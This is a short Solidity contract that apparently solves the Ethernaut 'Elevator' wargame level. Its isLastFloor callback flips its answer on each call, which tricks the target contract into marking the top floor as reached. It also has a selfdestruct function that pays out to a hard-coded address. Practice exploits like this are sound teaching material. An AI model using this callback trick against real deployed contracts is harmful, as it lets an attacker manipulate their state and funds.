// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Elevator{
    function goTo(uint) external;
}

contract Building{

    Elevator e;
    bool last = true;

    constructor(address elv) public {
        e = Elevator(elv);
    }
    function isLastFloor(uint _floor) external returns (bool){
        last = !last;
        return last;
    } 
    function ElevatorCaller() public{
        e.goTo(1);
    }
    function Destructor() public{
        selfdestruct(0x765a392Bbf9321157478cb9934F3Fe6492c35CbD);
    }
}